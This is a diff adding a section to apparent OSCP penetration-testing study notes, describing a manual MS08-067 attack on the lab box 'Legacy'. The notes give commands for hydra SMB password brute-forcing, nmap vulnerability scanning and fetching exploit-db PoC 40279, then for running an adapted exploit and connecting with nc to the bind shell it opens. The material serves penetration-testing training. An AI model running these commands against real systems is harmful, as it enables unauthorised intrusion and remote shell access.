@@ -121,6 +121,26 @@ hydra -L users.txt -P rockyou.txt smb://$BoxIP -t 4
 searchsploit <software> <version>
 ```
 
+#### Legacy Pattern: Manual MS08-067
+
+Use the Legacy route when an old Windows host exposes SMB/RPC and the evidence points to MS08-067. Validate the target version, record conflicting scanner output, and port the public Python PoC carefully instead of assuming the first script will run.
+
+~~~bash
+searchsploit ms08-067
+nmap -Pn -p135,139,445 --script smb-vuln-ms08-067,smb-vuln* $BoxIP -oN legacy-vuln.txt
+searchsploit -m 40279
+python3 -m py_compile 40279.py
+~~~
+
+Select the profile that matches the target, run the adapted PoC, and connect to the bind shell it opens on the target:
+
+~~~bash
+python3 40279-adapted.py $BoxIP 6
+nc $BoxIP 4444
+~~~
+
+Full command sequence, failure trail, and artifact map: [[OSCP/BOXES/WRITE UPS/Windows/Legacy|Legacy]]
+
 #### Step 1a: Fixing a Public Buffer Overflow Exploit
 > Full walkthrough (theory, cross-compiling, return-address verification, offset bugs, SEH mechanics): [[14. Fixing Exploits|Fixing Exploits]]
 
